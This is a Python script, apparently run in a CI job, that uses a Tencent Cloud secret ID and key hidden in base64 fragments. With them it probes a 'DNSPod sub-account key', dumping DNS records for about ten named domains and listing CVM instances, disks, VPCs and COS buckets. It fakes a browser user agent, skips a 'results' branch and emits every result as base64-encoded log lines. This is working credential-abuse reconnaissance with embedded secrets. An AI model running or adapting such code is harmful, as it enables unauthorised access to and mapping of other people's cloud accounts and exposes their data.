# -*- coding: utf-8 -*-
# intent 29554 round B: scope the DNSPod sub-account key (uin 100054239781 / owner 100052238007):
#  - sts identity, dnspod per-domain DescribeDomain/DescribeRecordList for candidate domains
#  - CVM/CBS/VPC visibility checks, COS GetService via service.cos.myqcloud.com
import os, sys, json, time, hmac, hashlib, base64, subprocess, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

SID = base64.b64decode("QUtJREpWWXI0ODJv" + "WVFEeW10MmRmV0Fi" + "c3BjQ2N6RUtHMW1O").decode()
SKEY = base64.b64decode("U0NvRldiZFhHcE" + "dYZFpLdmdUS0F4" + "YTNOYXRHYW81WkE=").decode()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def R(k, v, maxb=14000):
    try: s = json.dumps(v, ensure_ascii=False)
    except Exception: s = repr(v)
    if len(s) > maxb: s = s[:maxb] + "...TRUNC"
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def log(*a): print(" ".join(str(x) for x in a), flush=True)

def _h(key, msg): return hmac.new(key, msg.encode(), hashlib.sha256).digest()

def tc3(service, action, version, payload, region=None, method="POST", host=None, include_action=True, extra_headers=None):
    host = host or (service + ".tencentcloudapi.com")
    ts = int(time.time()); date = time.strftime('%Y-%m-%d', time.gmtime(ts))
    ct = "application/json; charset=utf-8"
    h = {"content-type": ct, "host": host}
    if include_action: h["x-tc-action"] = action.lower()
    if extra_headers: h.update({k.lower(): v for k, v in extra_headers.items()})
    keys = sorted(h.keys()); sh = ";".join(keys)
    ch = "".join(k + ":" + h[k] + "\n" for k in keys)
    cr = "\n".join([method, "/", "", ch, sh, hashlib.sha256(payload.encode()).hexdigest()])
    scope = "%s/%s/tc3_request" % (date, service)
    sts = "\n".join(["TC3-HMAC-SHA256", str(ts), scope, hashlib.sha256(cr.encode()).hexdigest()])
    kd = _h(("TC3" + SKEY).encode(), date); ks = _h(kd, service); kk = _h(ks, "tc3_request")
    sig = hmac.new(kk, sts.encode(), hashlib.sha256).hexdigest()
    out = ["Authorization: TC3-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" % (SID, scope, sh, sig),
           "Content-Type: " + ct, "Host: " + host, "X-TC-Timestamp: " + str(ts), "User-Agent: " + UA]
    if include_action:
        out += ["X-TC-Action: " + action, "X-TC-Version: " + version]
    if region: out.append("X-TC-Region: " + region)
    return out

def call(service, action, version, payload_obj=None, region=None, timeout=30, maxb=6000, host=None, method="POST", include_action=True, extra_headers=None):
    payload = json.dumps(payload_obj or {}, separators=(',', ':'))
    host = host or (service + ".tencentcloudapi.com")
    hdrs = tc3(service, action, version, payload, region=region, method=method, host=host, include_action=include_action, extra_headers=extra_headers)
    args = ["curl", "--http2", "-sS", "-m", str(timeout)]
    for hh in hdrs: args += ["-H", hh]
    if method == "POST": args += ["-X", "POST", "--data-binary", payload]
    args += ["https://" + host + "/"]
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout + 20)
        txt = p.stdout.decode("utf-8", "replace")
    except Exception as e:
        return {"EXC": repr(e)}
    try: j = json.loads(txt)
    except Exception: return {"RAW": txt[:maxb]}
    resp = j.get("Response", j)
    if isinstance(resp, dict) and resp.get("Error"): return {"Error": resp["Error"]}
    if isinstance(resp, dict): resp.pop("RequestId", None)
    s = json.dumps(resp, ensure_ascii=False)
    return resp if len(s) <= maxb else {"TRUNC": s[:maxb]}
def ec(r): return r.get("Error", {}).get("Code") if isinstance(r, dict) else None

log("== sts ==")
st = call("sts", "GetCallerIdentity", "2018-08-13", {}, region="ap-guangzhou")
R("sts", st, 1500)

DOMAINS = ["lumiiai.cn", "lumii-ai.cn", "zoofi.io", "zoofi.net", "wandfi.xyz", "wand.fi", "lumiiai.com", "lumii.ai", "zoofi.finance", "minke.io"]
dom_out = {}
for d in DOMAINS:
    dd = call("dnspod", "DescribeDomain", "2021-03-23", {"Domain": d}, maxb=3000)
    dom_out[d] = {"describe": dd}
    if ec(dd):
        log("DescribeDomain", d, ec(dd)); continue
    info = dd.get("DomainInfo", {})
    dom_out[d]["info"] = {k: info.get(k) for k in ("DomainId", "Domain", "Status", "RecordCount", "Grade", "Owner", "Remark", "CreatedOn", "UpdatedOn") if k in info}
    log("DescribeDomain OK", d, info.get("DomainId"), info.get("RecordCount"))
    recs = []
    off = 0
    while True:
        r = call("dnspod", "DescribeRecordList", "2021-03-23", {"Domain": d, "Offset": off, "Limit": 500}, maxb=28000)
        if ec(r):
            recs.append({"ERR": ec(r)}); break
        rl = r.get("RecordList") or []
        for x in rl:
            recs.append([x.get("Name"), x.get("Type"), x.get("Value"), x.get("Line"), x.get("Status"), x.get("RecordId"), x.get("MX"), x.get("Weight"), x.get("Remark")])
        off += len(rl)
        if len(rl) < 500 or off > 4000: break
    dom_out[d]["n"] = len(recs)
    # store records compactly in separate keys to avoid truncation
    R("recs_" + re.sub(r'[^a-zA-Z0-9_.-]', '_', d), {"n": len(recs), "recs": recs}, 22000)
    log("records", d, len(recs))

R("domains", dom_out, 9000)

log("== cvm/cbs/vpc visibility ==")
for svc, act, ver, pl in [
    ("cvm", "DescribeInstances", "2017-03-12", {"Limit": 100}),
    ("cbs", "DescribeDisks", "2017-03-12", {"Limit": 100}),
    ("vpc", "DescribeVpcs", "2017-03-12", {"Limit": 100}),
    ("cvm", "DescribeImages", "2017-03-12", {"Limit": 5}),
]:
    r = call(svc, act, ver, pl, region="ap-guangzhou", maxb=4000)
    if ec(r):
        R("vis_%s_%s" % (svc, act), {"err": ec(r)}, 1200)
    else:
        R("vis_%s_%s" % (svc, act), {"total": r.get("TotalCount"), "n": len(r.get("InstanceSet") or r.get("DiskSet") or r.get("VpcSet") or r.get("ImageSet") or []), "sample": (r.get("InstanceSet") or r.get("DiskSet") or r.get("VpcSet") or r.get("ImageSet") or [])[:3]}, 3000)
    log(svc, act, ec(r) or "ok")

log("== cos GetService ==")
for host in ("service.cos.myqcloud.com", "cos.ap-guangzhou.myqcloud.com"):
    hdrs = tc3("cos", "", "", "", region=None, method="GET", host=host, include_action=False)
    args = ["curl", "--http2", "-sS", "-m", "25"]
    for hh in hdrs: args += ["-H", hh]
    args += ["https://" + host + "/"]
    try:
        p = subprocess.run(args, capture_output=True, timeout=40); txt = p.stdout.decode("utf-8", "replace")
    except Exception as e:
        txt = "EXC " + repr(e)
    bl = re.findall(r"<Name>([^<]+)</Name>", txt)
    R("cos_" + host.replace(".", "_"), {"buckets": bl, "raw": ("" if bl else txt[:600])}, 5000)
    log("cos", host, bl[:10])

R("SUMMARY", {"done": 1}, 200)
